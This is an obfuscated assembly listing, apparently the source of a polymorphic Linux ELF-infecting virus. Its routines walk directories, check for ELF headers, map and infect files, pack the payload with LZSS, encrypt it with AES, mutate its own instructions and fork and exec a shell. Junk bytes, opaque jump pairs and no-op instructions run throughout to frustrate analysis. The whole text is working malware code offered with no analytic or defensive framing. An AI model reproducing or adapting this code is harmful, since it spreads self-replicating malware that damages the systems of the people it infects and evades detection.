    xor         r1, r1
    jmp         $+3
db 0x16
    js          ..@d1e5PHsp73XJ
    jns         ..@d1e5PHsp73XJ
..@YmTa3E3qKfXJ:
%ifdef X86_64
    mov         rbp, rbp
%endif
    jl          ..@STld9wsjq5VZ
    jge         ..@STld9wsjq5VZ
..@b2Qqnmeh5pjD:
    jl          ..@58XkK2iApQsx
    jl          ..@M8JVjAmV8TLk
    jge         ..@M8JVjAmV8TLk
..@txkOH77h1lMm:
    mov         rsi, QWORD [rsp+bytes]
    add         rsi, QWORD [rsp]
    mov         rcx, rdi
    sub         rcx, rsi
    cmp         rcx, 5
    jl          ..@LEVG2h8YkAu6
    jge         ..@LEVG2h8YkAu6
..@BJh8WBKplDA7:
    mov         rbp, rbp
    pop         rsi
    jmp         $+4
db 0x47, 0xfa
    jl          ..@QHmqrgG6iC4s
    jge         ..@QHmqrgG6iC4s
..@71bmS3iUIrJn:
    mov         bl, dl
    jmp         $+3
db 0x92
    jmp         $+4
db 0x0d, 0xd7
    jmp         $+3
db 0xff
    jl          ..@Z2ZBLj0JIRMi
    jge         ..@Z2ZBLj0JIRMi
..@ju0aRq2lMYO1:
    pop         r1
    jmp         $+4
db 0x45, 0x01
    jmp         $+4
db 0x4f, 0x4f
    jmp         ..@xaDeOcT6mIBN
..@C0reXm7nU0Si:
    cmp         dl, 68h
    je          ..@cvv6wNopR8si
    cmp         dl, 6ah
    je          ..@VV5pZp7IZbe7
    jmp         $+3
db 0xa8
    jmp         ..@SUP8zf0BfrqA
..@CowBUfe8be4S:
    rep         nop
    test        al, al
    jmp         $+4
db 0x5e, 0x64
    jl          ..@ot50qVtM9hbD
    jge         ..@ot50qVtM9hbD
..@1c8gaS2nvgpD:
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    call        UpdateSignature
    jmp         ..@FoABs5t3JqAT
..@CeTB4kcwqYPD:
%ifdef X86_64
    syscall
%endif
    jmp         $+4
db 0xfc, 0x11
    je          ..@w6wDqMr4EPHT
    jne         ..@w6wDqMr4EPHT
..@LTxyN9x0Fs5F:
%ifdef X86_64
    pop         rsi
%endif
    jmp         ..@DccI5U6o5yFM
..@LJqIP4eZuDp7:
    mov         ebx, 90909090h
    jl          ..@Y4HZlRe5kTN7
    jge         ..@Y4HZlRe5kTN7
..@8XLyANh7QliA:
%ifdef X86_64
    mov         edx, DWORD [rdi]
    cmp         dl, 41h
    xchg        rax, rax
    mov         rcx, rcx
%endif
    jb          ..@358E0vO2pJO2
    jae         ..@358E0vO2pJO2
..@LC9czikhFxbX:
    add         ecx, 4
    jmp         ..@yeKDybS5DOfl
..@n1xpvf1MWHcb:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    mov         rax, rax
    jmp         $+5
db 0x53, 0x73, 0xe4
    js          ..@cb9AoJAZZlW6
    jns         ..@cb9AoJAZZlW6
..@qr9FOs1vTFVY:
    mov         r2, [rsp+_PROC_OFF.dirname]
    call        Strcpy
    xchg        rbx, rbx
    jmp         ..@rOWMx0CFCMw3
..@eiTvI0BbG77R:
    pop         rdi
    ret
    jmp         $+3
db 0x0a
    je          ..@f9apXuvSh8aq
    jne         ..@f9apXuvSh8aq
..@z4Uhs2fjxiwd:
    cmp         rax, 0x00
    jmp         $+3
db 0xaf
    je          ..@ODc7wmF1uU8E
    jne         ..@ODc7wmF1uU8E
..@57stFcCjgyrT:
%ifdef X86_64
    pop         rdi
    cmp         dl, 41h
%endif
    je          ..@ox4vTm4a9jOx
    jne         ..@ox4vTm4a9jOx
..@i6inb1qxC978:
    mov         rbp, rbp
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.index-_signature.start
    mov         DWORD [rdi], eax
    push        rcx
    jmp         ..@bYCETUm6ysJq
..@TXUOBHkQaV1i:
%ifdef X86_32
    mov         dx, WORD [edi]
    and         dx, 0f8f8h
    cmp         dx, 5850h
    je          ..@3VbMPYOt5tFG
%endif
    js          ..@F3Hmg8KBFVVr
    jns         ..@F3Hmg8KBFVVr
..@sSgKnH9kGJs1:
    syscall
    xor         r1, r1
    CFILE       DWORD [r5+file.filefd]
    jmp         $+5
db 0x48, 0x6d, 0xdc
    js          ..@ZHiVnqiCdNhn
    jns         ..@ZHiVnqiCdNhn
..@aXwyaJqDcp43:
    test        rax, rax
    jmp         $+5
db 0x6e, 0xac, 0xfc
    jmp         ..@bQlxb6cav2mg
..@ss2CF6vtJFbA:
    add         rdi, rbx
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    add         ecx, 1
    js          ..@p6Nx4CNmUARs
    jns         ..@p6Nx4CNmUARs
..@WayzuRbI07iz:
%ifdef X86_64
    xor         rax, rax
%endif
    js          ..@W8fDPWsZYGRD
    jns         ..@W8fDPWsZYGRD
..@BmAK0w15vwfV:
%ifdef X86_64
    jz          ..@U7580DFsEF3v
%endif
    jmp         ..@rNPiV1ttLhtD
..@Ef4O39pP0jhG:
    and         bl, 11000111b
    jl          ..@AMbiWhNiKP4N
    jge         ..@AMbiWhNiKP4N
..@y5YIpYNUpn6w:
    push        rbx
    pop         rbx
    mov         rcx, QWORD [rsp]
    push        rbx
    pop         rbx
    jmp         $+4
db 0x66, 0x0b
    jmp         ..@fvY2IzGWwB8Y
..@26zbwQVdkIUf:
    sub         r2, non_encrypted_len
    and         r2, 0xfffffffffffffff0
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    jmp         $+5
db 0x7d, 0x02, 0x35
    jmp         $+5
db 0xab, 0x9a, 0xc3
    jmp         $+4
db 0x09, 0x84
    jl          ..@Ee4DkrZ2gjvf
    jge         ..@Ee4DkrZ2gjvf
..@nA4CEctvmdS3:
%ifdef X86_64
    mov         ebx, 90008900h
%endif
    jmp         ..@rQRqrc8emApy
..@7D2AVLXvx8tt:
    cmp         ecx, DWORD [rsp+_MUTA_OFF.size]
    jge         ..@NcHpm1IzVJQN
    jmp         $+4
db 0x1e, 0x39
    jmp         $+5
db 0x8e, 0x1c, 0x7c
    jmp         ..@uouuIU7uTAjT
..@Nt7iPSSv0Ptv:
%ifdef X86_64
    xor         r9, r9
    mov         rsi, original_virus_len+PADDING
    mov         rcx, rcx
    mov         edx, 11b
%endif
    jmp         ..@qSBoZtn51QIR
..@PvKQbaCUviFj:
%ifdef X86_64
    je          ..@gdxWmThcBjhG
%endif
    jmp         $+4
db 0x86, 0x38
    jmp         $+4
db 0x29, 0xc7
    jmp         ..@Z097ESfypDSM
..@mBYYSkm2RAIg:
    cmp         dx, 800fh
    jmp         ..@IaIlM6b2wQzQ
..@ev1e9lrPjkna:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+3
db 0x24
    je          ..@DXg4gnwBrHf7
    jne         ..@DXg4gnwBrHf7
..@9C99Gu4KiI5p:
    ret
    jl          MapFile
    jge         MapFile
..@ePr87Ih046g4:
    push        rsi
    pop         rsi
    jl          ..@xpyuQHqSMQmz
    jge         ..@xpyuQHqSMQmz
..@FCf1CT2OqXqU:
    mov         rdx, rdx
    add         rsp, _KEYGEN_OFF_size
    xchg        rdi, rdi
    pop         r3
    jmp         $+3
db 0xcd
    jmp         ..@kCr7cHdqSIrc
..@GKGnQXZ3RWSJ:
    call        WORDToDWORDASCII
    jmp         $+4
db 0xb8, 0x0a
    jmp         $+5
db 0x03, 0x5d, 0x77
    jmp         ..@tjGZEGIniwbV
..@CGVxK5QjCOdV:
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    jmp         $+3
db 0x5d
    jmp         ..@GBdhlGSG5X1o
..@AVuqzdHfi0kK:
    pop         rbx
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jl          ..@K0ChnjSzwjHq
    jge         ..@K0ChnjSzwjHq
..@24M3UDKSlWdI:
    mov         rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jz          ..@jH0VnblkeDxC
    jl          ..@Se8wv4Cv6Wya
    jge         ..@Se8wv4Cv6Wya
..@fcqXEK5bxTLG:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    call        InfectFile
    jl          ..@LCVrLHKyODmi
    jge         ..@LCVrLHKyODmi
..@iXRn1T2TwrWn:
    push        rsi
    pop         rsi
    mov         rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         $+4
db 0x66, 0xa5
    jmp         $+5
db 0x8a, 0x4c, 0xf3
    jmp         $+3
db 0xcf
    jmp         ..@jhGH6iemD5ZE
..@zSBKMXNJ2olZ:
    mov         rdi, rdi
    rep         movsb
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    jb          ..@zt1TxXkbEAdl
    jae         ..@zt1TxXkbEAdl
..@GHbbznCkBz9n:
    cmp         QWORD m6, 0x00
    je          ..@IqyIJNVLcwnu
    cmp         QWORD m7, 0x00
    je          ..@IqyIJNVLcwnu
    mov         r4, m7
    jb          ..@vSWbRP6qVOgq
    jae         ..@vSWbRP6qVOgq
..@Z7JnXZENui3Z:
    add         r1, non_packed_len+PADDING
    mov         r2, m8
    mov         rsp, rsp
    mov         r3, original_virus_len-non_packed_len
    call        MemMove
    je          ..@56N4dL3su0y3
    jne         ..@56N4dL3su0y3
..@vf9VIvdT8Pi4:
    ret
    jmp         $+3
db 0xdc
    jb          UnmapFile
    jae         UnmapFile
..@Ed24WXNggmx0:
    push        rcx
    jmp         $+4
db 0x03, 0x29
    jmp         $+4
db 0xb5, 0x47
    jmp         ..@vDjRTdFi82Ii
..@lgMtrShDYvh5:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
    mov         rax, SYS_WAIT4
    mov         rax, rax
    syscall
%endif
    jmp         $+3
db 0xcd
    je          ..@eG7bBys6xAkq
    jne         ..@eG7bBys6xAkq
..@dWR8fbLkgDv4:
    xchg        rax, rax
    jmp         ..@hMW3KbBaIi9y
    jmp         $+5
db 0xee, 0xaf, 0x30
    js          ..@gdxWmThcBjhG
    jns         ..@gdxWmThcBjhG
..@XeJTvrWOLO6j:
    xor         rdx, rdx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    push        rdx
    jmp         ..@jIohO6kvk3Md
..@thFYj1In6xMU:
    mov         rax, SYS_FORK
    jmp         ..@K04XE3t5i6bS
..@NaRzZVaTOhmm:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    jl          ..@hyyhKlbdYhYP
    jge         ..@hyyhKlbdYhYP
..@i5dYIoxQ6q8D:
    cmp         DWORD [r1], 0x464c457f
    jne         ..@kKkjwJO0fIuY
    jmp         $+5
db 0x9f, 0x38, 0xc1
    jl          ..@chBgFDsMHk0u
    jge         ..@chBgFDsMHk0u
..@TzzlP47vvsSW:
    add         rsi, 1
    js          ..@KFClf28MmUCY
    jns         ..@KFClf28MmUCY
..@dSVGz0qhLEuy:
    mov         BYTE [rsi], bl
    jmp         $+5
db 0x80, 0xf5, 0xeb
    jmp         ..@3mvDoHbMO4pb
..@t05NebrBROmj:
%ifdef X86_64
    mov         rax, 0x0000900000000000
%endif
    jmp         $+3
db 0x24
    jl          ..@kbZOQNCIMFf0
    jge         ..@kbZOQNCIMFf0
..@mB1Uaw57qg8S:
    pop         rcx
    jmp         $+4
db 0x72, 0x3f
    jmp         $+4
db 0xf1, 0xc7
    jmp         ..@PoTzAzN2JRHh
..@v8R1UCit50Ke:
%ifdef X86_32
    cmp         dx, 00c083h
    je          ..@gdxWmThcBjhG
    cmp         dx, 00e883h
    je          ..@gdxWmThcBjhG
    cmp         dx, 00c081h
%endif
    jl          ..@aW9UCMBkNJrZ
    jge         ..@aW9UCMBkNJrZ
..@YMgI9xsbuOMe:
    rep         movsd
    xor         rax, rax
    rep         nop
    jmp         $+5
db 0x22, 0x06, 0x1f
    jmp         ..@QNCXDubRMQvA
..@fdgLf0HkYCAP:
    xor         rcx, rcx
    mov         ecx, edx
    jmp         $+5
db 0xd1, 0x78, 0x4a
    jmp         $+4
db 0x10, 0x0a
    js          ..@CwhPiThO4Mjj
    jns         ..@CwhPiThO4Mjj
..@IEK5StFUfQkZ:
    mov         r2, r1
    jmp         ..@ThquYiAGOjhH
..@NBLCwSS6dvKZ:
    rep         movsb
    xor         rax, rax
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    call        WORDToDWORDASCII
    jmp         $+5
db 0x1e, 0x1c, 0x49
    jmp         $+4
db 0x5c, 0x3e
    jl          ..@i6inb1qxC978
    jge         ..@i6inb1qxC978
..@jotUJsGkIQRK:
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    xchg        rsp, rsp
    mov         r2, 1b
    call        MapFile
    jmp         $+5
db 0x10, 0x10, 0x51
    js          ..@SXQaYtKVtcmF
    jns         ..@SXQaYtKVtcmF
..@dXdWb92EbqNd:
    push        rcx
    pop         rcx
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    xchg        rdx, rdx
    mov         r1, r5
    jmp         $+5
db 0xfa, 0x8d, 0xcd
    js          ..@PUkftooUCdBf
    jns         ..@PUkftooUCdBf
..@SjEnO9jmXAYU:
    jmp         ..@0cuwo91qh6ib
    jmp         $+5
db 0x9d, 0xe1, 0xc1
    jmp         ..@NT6TkKIglTKq
..@C7ERrVvpl4ZT:
    sub         rsp, _NBF_OFF_size
    jmp         $+5
db 0x8a, 0xaa, 0x38
    jmp         ..@Xo7nlmWvriMi
..@3BT6jD2P7RVA:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    jmp         $+4
db 0x80, 0xf0
    jmp         $+4
db 0xfe, 0xe7
    jl          ..@UGLrL2A1ltPL
    jge         ..@UGLrL2A1ltPL
..@4TPEtJo8RX6O:
    pop         rcx
    pop         rsi
    xchg        rdi, rdi
    jl          ..@wJrgueTw7rAy
    jge         ..@wJrgueTw7rAy
..@ehWMni5OiQKV:
    cmp         bl, 58h
    jmp         $+5
db 0x37, 0x83, 0xc7
    jmp         $+4
db 0x56, 0x46
    jmp         ..@W9Hf3bUK3lPn
..@m0hseK6n64f3:
    rep         nop
    jmp         $+3
db 0x1e
    jl          ..@b2Qqnmeh5pjD
    jge         ..@b2Qqnmeh5pjD
..@3xLrYrKEc6zb:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jge         ..@LCVrLHKyODmi
    mov         rbp, rbp
    jmp         $+5
db 0x68, 0xa3, 0xe2
    js          ..@tPjNQxEUuXLQ
    jns         ..@tPjNQxEUuXLQ
..@ZyULGfioSvnW:
    xor         r2, r2
    mov         r2w, WORD [r5+e_h.e_shnum]
    xor         rax, rax
    push        rdx
    pop         rdx
    jmp         $+4
db 0xff, 0x7e
    jb          ..@yNJuygIQ3MC0
    jae         ..@yNJuygIQ3MC0
..@tNTe75tZ3tKQ:
    jz          ..@sEpsjAWEdXVa
    js          ..@vRLoJlKb0VNg
    jns         ..@vRLoJlKb0VNg
..@xKw3ocC9Ot7W:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         $+4
db 0x56, 0x1e
    jmp         $+3
db 0x02
    jmp         $+5
db 0x16, 0xe8, 0xd0
    jl          ..@8upLpdTxKwN3
    jge         ..@8upLpdTxKwN3
..@1fpYkkP1SwR1:
%ifdef X86_32
    and         edx, 0000c0ffh
    xchg        rbx, rbx
    mov         rsp, rsp
%endif
    js          ..@iIzUR5cC5Pxr
    jns         ..@iIzUR5cC5Pxr
..@ajQFF9KdToqq:
    and         dx, 0f0ffh
    jmp         ..@mBYYSkm2RAIg
..@135bkN6SpLLn:
%ifdef X86_64
    je          ..@bkgJAymg82JB
%endif
    jb          ..@TohcD9rvi8Bl
    jae         ..@TohcD9rvi8Bl
..@3Gjz4PKGxHa5:
    xor         rax, rax
    xor         rdx, rdx
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    xchg        rsi, rsi
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jb          ..@KaUfKlRM08J4
    jae         ..@KaUfKlRM08J4
..@CobgjeJhLkHn:
    jmp         ..@4vmCv80yWkBf
    jmp         ..@3Gjz4PKGxHa5
..@BWcct29veIbC:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@kbzdHnrXb1gT
..@q0VcWcRD92Oo:
    jle         ..@4vmCv80yWkBf
    jmp         $+5
db 0x78, 0x2c, 0x99
    jmp         $+3
db 0x8f
    jmp         $+5
db 0x04, 0x7d, 0x1d
    jl          ..@3PjFBed1B5sL
    jge         ..@3PjFBed1B5sL
..@57dEqTpjUIwH:
    call        ConvertMoveValueToPushPopValue
    jmp         $+5
db 0xc6, 0x1e, 0x64
    jmp         $+4
db 0xce, 0x86
    je          ..@24M3UDKSlWdI
    jne         ..@24M3UDKSlWdI
..@w32pVA3QUAln:
    mov         r4, r3
    jmp         $+4
db 0xcf, 0xe8
    js          ..@VG5xE2EEeDBy
    jns         ..@VG5xE2EEeDBy
..@Zt27JdoZ5pgJ:
%ifdef X86_64
    mov         bl, 41h
%endif
    jl          ..@0CWJ51Om8H36
    jge         ..@0CWJ51Om8H36
..@SRxVFdmFnJYt:
    mov         rdx, rsi
    jmp         ..@IxdOCeTd9pw6
..@dVnxaz7lAJVX:
    jmp         ..@HjStPXOpCO4W
    js          ..@2QSjaDhfeh7U
    jns         ..@2QSjaDhfeh7U
..@z3vX8JB2aUDY:
%ifdef X86_64
    xor         rcx, rcx
%endif
    jmp         $+3
db 0x14
    jmp         $+3
db 0x28
    jmp         $+5
db 0x64, 0xf8, 0x63
    jb          ..@kUHtx8Vw9ORH
    jae         ..@kUHtx8Vw9ORH
..@ObfVqPmPF1EF:
    pop         r3
    pop         r4
    pop         r5
    jmp         ..@JQF4qpdpBtOl
..@dwzytAqcExQt:
    mov         rax, 0x20
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         $+4
db 0xcd, 0x19
    js          ..@CowBUfe8be4S
    jns         ..@CowBUfe8be4S
..@P5J99ZrwKLvw:
    xor         rcx, rcx
    jmp         $+3
db 0x02
    js          ..@Qz3EhPvsxHBX
    jns         ..@Qz3EhPvsxHBX
..@Tbxfl2lMayZ2:
    mov         DWORD [rdi], eax
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    call        WORDToDWORDASCII
    jb          ..@SL8ODQEqRBGl
    jae         ..@SL8ODQEqRBGl
..@9Uun72ZN9Q6T:
    jmp         ..@hMW3KbBaIi9y
    jb          ..@OruHIRMP3tbl
    jae         ..@OruHIRMP3tbl
..@SiOGf3VBjZk2:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jmp         ..@aFRwZ6s6UWTH
..@1FyeN4V6M4Ub:
    mov         rdi, rdi
    jmp         $+4
db 0xf3, 0x1b
    jl          ..@VIesAahoa5ZK
    jge         ..@VIesAahoa5ZK
..@JgKwyys8TmzR:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    xchg        rax, rax
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    mov         rcx, rcx
    jmp         $+5
db 0xda, 0xad, 0x94
    jmp         ..@OE44EoMWmYEa
..@mNHGLjgTNWnQ:
    lea         r4, [r1]
    add         r4, r3
    xor         r2, r2
    jmp         ..@ijvpO5H3vfYy
..@HOyBiLls6QdJ:
    push        rsi
    push        rcx
    jmp         $+4
db 0x93, 0x97
    jl          ..@oQZBLCohBqGR
    jge         ..@oQZBLCohBqGR
..@bpBbmjcefcJt:
    mov         rsi, QWORD [rsp+bytes]
    mov         rcx, QWORD [rsp]
    mov         DWORD [rsi+rcx], ebx
    add         rcx, 4
    jmp         $+3
db 0xba
    jmp         $+4
db 0xed, 0xed
    jl          ..@11VAWvBZx8hu
    jge         ..@11VAWvBZx8hu
..@ibHI3UocMnlw:
%ifdef X86_64
    sete        cl
%endif
    jmp         $+5
db 0x9a, 0xf5, 0xf5
    jmp         $+3
db 0xef
    jmp         ..@135bkN6SpLLn
..@9wh8Bh5U58gB:
    pop         rbx
    and         dl, 00101000b
    test        dl, dl
    jz          ..@OruHIRMP3tbl
    jmp         $+4
db 0x26, 0x05
    jmp         ..@gkudJwVfgeAm
UnmapFile:
    jmp         ..@x1AAlIPgxWAD
..@ZKbC9wn0PQQY:
    push        rbx
    pop         rbx
    je          ..@FCf1CT2OqXqU
    jne         ..@FCf1CT2OqXqU
..@T8kwCIo4qd0s:
%ifdef X86_64
    mov         eax, SYS_MMAP
    syscall
%endif
    jmp         $+3
db 0x08
    jl          ..@RbNqWuWIUzBL
    jge         ..@RbNqWuWIUzBL
..@bORoJ2ItQctc:
    mov         rbx, rbx
    xchg        rcx, rcx
    jmp         ..@d94BKV8hB7Vr
..@Q5PwhskNUNfm:
    OFILE       QWORD [r2], r4
    cmp         eax, 0x3
    jmp         ..@SsBhCjDPL1KF
..@Uy8hBCcFceSb:
    pop         rax
    jmp         $+4
db 0x42, 0x73
    jb          ..@t01ODOQlK1MR
    jae         ..@t01ODOQlK1MR
..@2jTN2QjuXPZz:
%ifdef X86_64
    or          dl, 1b
    shr         rax, 8
%endif
    jl          ..@CUiPpAfpt7Dv
    jge         ..@CUiPpAfpt7Dv
..@OruHIRMP3tbl:
    or          bl, 00101000b
    mov         BYTE [rsi], bl
    jmp         ..@YtnYaSniTSrM
    js          ..@Ef4O39pP0jhG
    jns         ..@Ef4O39pP0jhG
..@vArVdgKrwq9i:
    add         r2, signature_len
    movv        r3, keycreation_len
    movr        r1, rsp
    jmp         $+5
db 0xad, 0xe2, 0x2f
    jmp         $+4
db 0xf8, 0x9a
    jmp         ..@RfSKIafCnyPr
..@6B6oeBX9t6Du:
    pop         rcx
    mov         rsp, rsp
    pop         rsi
    jmp         $+3
db 0x8e
    je          ..@3rSSyPn2atoD
    jne         ..@3rSSyPn2atoD
..@OTCYkpPXHIPg:
    mov         rbp, rbp
    jmp         $+5
db 0x62, 0x59, 0xfb
    jmp         $+4
db 0x51, 0x2f
    jb          ..@j2Nv61LvYIyt
    jae         ..@j2Nv61LvYIyt
..@PaJYkmPSo2ag:
    je          ..@LCVrLHKyODmi
    mov         r2d, DWORD [r1]
    and         r2, 0x00ffffff
    jl          ..@RGq4ydpd4bZk
    jge         ..@RGq4ydpd4bZk
..@coBtSnJdyNR4:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         $+3
db 0xdb
    jmp         ..@zP3yrK8T6KNY
..@ctFoj25qMslR:
%ifdef X86_64
    and         edx, 0000f8ffh
%endif
    jmp         $+3
db 0x97
    jmp         ..@YmTa3E3qKfXJ
..@sl7n7YJjJoaX:
%ifdef X86_64
    and         bl, 00000101b
    mov         rcx, rcx
%endif
    jmp         $+3
db 0x70
    je          ..@ejqD92AHVfYU
    jne         ..@ejqD92AHVfYU
..@BZY4pInrgK5y:
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    xor         r1, r1
    xchg        rsi, rsi
    js          ..@E0erwFFMNird
    jns         ..@E0erwFFMNird
..@NF08xmUoDtd4:
%ifdef X86_32
    shl         cx, 8
%endif
    jmp         $+3
db 0xe9
    jmp         $+4
db 0xd5, 0xc1
    js          ..@VjgGtVCe94CR
    jns         ..@VjgGtVCe94CR
..@APsSGOzGSKPe:
    ret
    jmp         $+5
db 0xbb, 0x19, 0xa6
    js          Strcpy
    jns         Strcpy
..@F31Mc7GeMJF5:
    ret
    jmp         ..@gVoAMq3m9nek
..@laTttCyzj7jM:
%ifdef X86_64
    mov         edx, r10d
    mov         r10d, 0x01
    push        rdx
    pop         rdx
    mov         r8d, DWORD [r8+file.filefd]
%endif
    jmp         $+3
db 0x25
    js          ..@T8kwCIo4qd0s
    jns         ..@T8kwCIo4qd0s
..@6tHBzgu3PJ9q:
%ifdef X86_32
    xor         ebx, ebx
    xchg        rdi, rdi
    mov         ecx, DWORD [edi+file.filesize]
    mov         edx, esi
%endif
    jl          ..@YDV3d0aiciTx
    jge         ..@YDV3d0aiciTx
..@56N4dL3su0y3:
    mov         rbx, rbx
    push        rcx
    pop         rcx
    mov         rsi, rsi
    jmp         ..@LG6mTK12RLnw
..@47LOK8xVPebv:
    ret
    jmp         $+3
db 0x16
    js          ..@pvlZ8vgXBRN0
    jns         ..@pvlZ8vgXBRN0
..@29PHlnfqcsGD:
%ifdef X86_64
    jz          ..@0CWJ51Om8H36
%endif
    jmp         $+3
db 0x4c
    jb          ..@Mi3Xc53aYSbj
    jae         ..@Mi3Xc53aYSbj
..@RbNqWuWIUzBL:
    cmp         rax, 0xffffffffffffffff
    mov         rsi, rsi
    je          ..@GxtQtVk6t89u
    push        rdx
    pop         rdx
    jmp         $+3
db 0xd0
    js          ..@A7KrE4DhAwbM
    jns         ..@A7KrE4DhAwbM
..@WY76Wq8xo1ao:
    shl         edx, POSITION_BITS+LENGTH_BITS
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    shl         ebx, LENGTH_BITS
    or          bx, ax
    jmp         $+5
db 0x92, 0x12, 0x1b
    jmp         ..@qTjVhWrcA0J5
..@Z097ESfypDSM:
%ifdef X86_32
    xchg        rdx, rdx
    mov         dx, WORD [rdi]
    xchg        rdx, rdx
    rep         nop
    and         dx, 0f8ffh
%endif
    jmp         $+4
db 0xd4, 0x9f
    jmp         $+3
db 0xf7
    jmp         ..@v8R1UCit50Ke
..@1je6YHVyhQUw:
%ifdef X86_32
    shr         edx, 11
%endif
    jmp         $+4
db 0x5e, 0xcf
    jmp         ..@4EBpVhincLAp
..@xhPoys1jryZn:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    jmp         $+4
db 0xd1, 0xcc
    jb          ..@bY78pjjRKsZ6
    jae         ..@bY78pjjRKsZ6
..@ObMQAvJ5c916:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+5
db 0xa8, 0xe3, 0xf2
    jmp         $+4
db 0xda, 0x22
    jb          ..@HHhSjcM9JncM
    jae         ..@HHhSjcM9JncM
..@re9aULg45Ao1:
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    jmp         $+3
db 0xd0
    js          ..@e7se5EjvstVK
    jns         ..@e7se5EjvstVK
..@UKDvWB1oeMrw:
    mov         rdi, m6
    jb          ..@aMJzExN5GzLp
    jae         ..@aMJzExN5GzLp
..@5P7Acb8OSlJ2:
    ret
    jmp         $+3
db 0xbf
    js          FileValidation
    jns         FileValidation
..@M94fLfKiuLbH:
    mov         QWORD [rsp+_AESE_OFF.length], r2
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    mov         rsi, rsp
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    push        rbp
    jmp         $+5
db 0x1b, 0x19, 0xd8
    jmp         $+3
db 0xdc
    jmp         ..@LUg8jmgtgjtT
..@IogqjLwLc1xl:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+5
db 0xf0, 0xee, 0xec
    js          ..@fR2JI9maySRf
    jns         ..@fR2JI9maySRf
..@K04XE3t5i6bS:
    syscall
    test        eax, eax
    jnz         ..@WcI5xRsIRgMY
    jmp         $+5
db 0xaf, 0xc9, 0xbe
    jmp         ..@5uDCpXeOLmQq
..@gH7criOwfBdm:
    push        rax
    pop         rax
    xor         rcx, rcx
    xor         rdx, rdx
    mov         ecx, DWORD [rdi+1]
    jmp         ..@GoDzI3FzIKZ9
..@DXg4gnwBrHf7:
    mov         rax, (-1)
    jmp         ..@9Ryq9lQLJ5Nx
..@LG6mTK12RLnw:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    xchg        rdx, rdx
    call        KeyGen
    jmp         $+5
db 0x60, 0x32, 0x89
    jmp         $+3
db 0x62
    jmp         ..@szImhLLkRhm5
..@CWIX5RkAnUG9:
    push        rdx
    jmp         $+3
db 0xe0
    jmp         $+4
db 0x63, 0x75
    jl          ..@ezV1MQT2q4El
    jge         ..@ezV1MQT2q4El
..@QJkuao4In4v1:
    xor         rax, rax
    jmp         $+3
db 0x2c
    jb          ..@F31Mc7GeMJF5
    jae         ..@F31Mc7GeMJF5
..@rBPp9adgdReb:
%ifdef X86_32
    cmp         edx, 9090c031h
%endif
    jmp         $+3
db 0xa3
    jl          ..@jYdTDwn1FCav
    jge         ..@jYdTDwn1FCav
..@5dJPPoF1F8sg:
    push        r5
    push        r4
    push        r3
    push        r2
    sub         rsp, _DYNPIE_OFF_size
    jmp         $+5
db 0xdd, 0x6a, 0x7a
    jl          ..@NQvcqspJlBtv
    jge         ..@NQvcqspJlBtv
..@h6l5cJIuPpZk:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         ..@BDJItaPWcKey
..@ALNWva3Ujrgw:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    mov         r1, r5
    mov         eax, SYS_EXECVE
    syscall
%endif
    jmp         ..@t51iVl0V3Zky
..@xtP96RFW1w66:
    aesenc      xmm0, xmm1
    jl          ..@bLGN9AUvkhZi
    jge         ..@bLGN9AUvkhZi
..@fuu777iemhzM:
    add         r1, 1
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
